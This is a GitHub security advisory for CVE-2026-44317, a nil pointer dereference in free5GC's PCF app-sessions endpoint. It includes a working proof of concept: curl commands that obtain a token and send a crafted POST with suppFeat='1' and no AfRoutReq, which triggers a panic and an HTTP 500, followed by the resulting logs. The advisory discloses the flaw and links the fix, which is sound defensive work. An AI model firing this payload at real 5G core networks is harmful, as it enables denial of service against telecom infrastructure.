# [M] free5GC's PCF npcf-policyauthorization POST /app-sessions panics on suppFeat=1 with missing AfRoutReq via nil pointer dereference

## Summary
Severity: Medium
Advisory: GHSA-wwqh-7jm5-gj7w
CVE: CVE-2026-44317
CWE: CWE-476, CWE-754
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-05-08
Source: https://github.com/advisories/GHSA-wwqh-7jm5-gj7w
Type: github-advisory

## Affected
- Go: `github.com/free5gc/pcf` — affected >=0 <1.4.3

## Details
### Summary
free5GC's PCF `POST /npcf-policyauthorization/v1/app-sessions` handler panics on a single authenticated request whose `ascReqData.suppFeat == "1"` (enabling traffic-routing feature negotiation) and whose `medComponents` entries supply an `afAppId` but NO `AfRoutReq`. The create path then calls `provisioningOfTrafficRoutingInfo(smPolicy, appID, routeReq, ...)` with `routeReq == nil` and dereferences `routeReq.RouteToLocs` (and other fields) without a nil check, causing `runtime error: invalid memory address or nil pointer dereference`. Gin recovery converts the panic into `HTTP 500`.

The trigger is a single valid authenticated request -- changing only `suppFeat` from `"0"` to `"1"` flips the same shape of POST from a normal `201 Created` into a panic-driven `500`.

This endpoint requires a valid `npcf-policyauthorization` OAuth2 access token (PR:L). The PCF process is not killed (Gin recovers); the realized impact is per-request panic-DoS on the app-session create path.

### Details
Validated against the PCF container in the official Docker compose lab.
- Source repo tag: `v4.2.1`
- PCF endpoint: `http://10.100.200.9:8000`
- Validation date: 2026-03-12

Vulnerable handler path:
```
postAppSessCtxProcedure
 -> medComponents loop
   -> appID := medComp.AfAppId
      routeReq := medComp.AfRoutReq   // nil when AfRoutReq absent
      provisioningOfTrafficRoutingInfo(smPolicy, appID, routeReq, medComp.FStatus)
```

In `provisioningOfTrafficRoutingInfo`, `routeReq.RouteToLocs`, `routeReq.UpPathChgSub`, and `routeReq.AppReloc` are dereferenced directly without a nil check. When `suppFeat` is `"0"` the traffic-routing branch is not entered and the same input shape returns `201 Created`; when `suppFeat` is `"1"` the branch is entered and the nil-deref fires.

Code evidence (paths in `free5gc/pcf`):
- Affected route + dispatch: `NFs/pcf/internal/sbi/api_policyauthorization.go`
- Create handler path: `NFs/pcf/internal/sbi/processor/policyauthorization.go`
- Call site that passes nil `routeReq` into the traffic-routing helper: `NFs/pcf/internal/sbi/processor/policyauthorization.go`
- Panic site (nil deref of `routeReq.*` fields): `NFs/pcf/internal/sbi/processor/policyauthorization.go:1740`

### PoC
Reproduced end-to-end against the running PCF at `http://10.100.200.9:8000`.

1. Obtain a valid `npcf-policyauthorization` token from NRF:
```
curl -sS -X POST 'http://10.100.200.3:8000/oauth2/token' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'grant_type=client_credentials&nfType=NEF&nfInstanceId=b84c4f0a-6010-4972-8480-e44e625b9ee4&targetNfType=PCF&scope=npcf-policyauthorization'
```

2. Trigger the panic with a single valid authenticated POST whose `ascReqData.suppFeat == "1"`, `medComponents` supplies `afAppId`, and `AfRoutReq` is absent:
```
curl -i -X POST 'http://10.100.200.9:8000/npcf-policyauthorization/v1/app-sessions' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: Bearer <valid_npcf_policyauthorization_jwt>' \
  --data '{"ascReqData":{"suppFeat":"1","notifUri":"http://127.0.0.1:9999/appsess","ueIpv4":"10.60.0.3","dnn":"internet","medComponents":{"1":{"medCompN":1,"afAppId":"app1"}}}}'
```
```
HTTP/1.1 500 Internal Server Error
```

3. Control comparison -- same request shape but `suppFeat="0"` -> normal `201 Created`:
```
curl -i -X POST 'http://10.100.200.9:8000/npcf-policyauthorization/v1/app-sessions' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: Bearer <valid_npcf_policyauthorization_jwt>' \
  --data '{"ascReqData":{"suppFeat":"0","notifUri":"http://127.0.0.1:9999/appsess","ueIpv4":"10.60.0.3","dnn":"internet","medComponents":{"1":{"medCompN":1,"afAppId":"app1"}}}}'
```
```
HTTP/1.1 201 Created
```

4. PCF container logs show the panic stack landing in `provisioningOfTrafficRoutingInfo` with `routeReq = 0x0`:
```
[ERRO][PCF][GIN] panic: runtime error: invalid memory address or nil pointer dereference
  github.com/free5gc/pcf/internal/sbi/processor.provisioningOfTrafficRoutingInfo(..., 0x0, ...)
      .../policyauthorization.go:1740
  github.com/free5gc/pcf/internal/sbi/processor.(*Processor).postAppSessCtxProcedure
      .../policyauthorization.go:288
  github.com/free5gc/pcf/internal/sbi/processor.(*Processor).HandlePostAppSessionsContext
      .../policyauthorization.go:139
  github.com/free5gc/pcf/internal/sbi.(*Server).HTTPPostAppSessions
      .../api_policyauthorization.go:119
[INFO][PCF][GIN] | 500 | POST | /npcf-policyauthorization/v1/app-sessions |
```

### Impact
NULL pointer dereference (CWE-476) caused by improper handling of an exceptional branch (CWE-754): the create path passes `routeReq` straight into `provisioningOfTrafficRoutingInfo` without a nil check, even though `medComp.AfRoutReq` is optional and is nil for the demonstrated valid input shape. The control experiment with `suppFeat="0"` proves the request shape itself is otherwise valid.

Gin recovery catches the panic, so the PCF process is NOT killed and other endpoints continue serving. The realized impact is per-request: any authenticated POST against this endpoint with `suppFeat="1"` and `medComponents.*.AfAppId` set but `AfRoutReq` absent returns `HTTP 500` with empty body and a stack trace in PCF logs.

Any party that holds (or can obtain) a valid `npcf-policyauthorization` token can repeatedly drive this code path to sustain a per-request panic-DoS on the app-session create endpoint, with each panic costing more CPU + log writes than the intended controlled response would have.

No Confidentiality impact (the response is `500` with empty body). No persistent Integrity impact (the panic happens before any state mutation). Availability impact is limited to per-request degradation.

Affected: free5gc v4.2.1.

Upstream issue: https://github.com/free5gc/free5gc/issues/879
Upstream fix: https://github.com/free5gc/pcf/pull/65

## References
- https://github.com/free5gc/free5gc/security/advisories/GHSA-wwqh-7jm5-gj7w
- https://nvd.nist.gov/vuln/detail/CVE-2026-44317
- https://github.com/free5gc/free5gc/issues/879
- https://github.com/free5gc/pcf/pull/65
- https://github.com/free5gc/pcf/commit/508d70b8527a6c8c923179dad450ea01e16b6aeb
- https://github.com/free5gc/free5gc
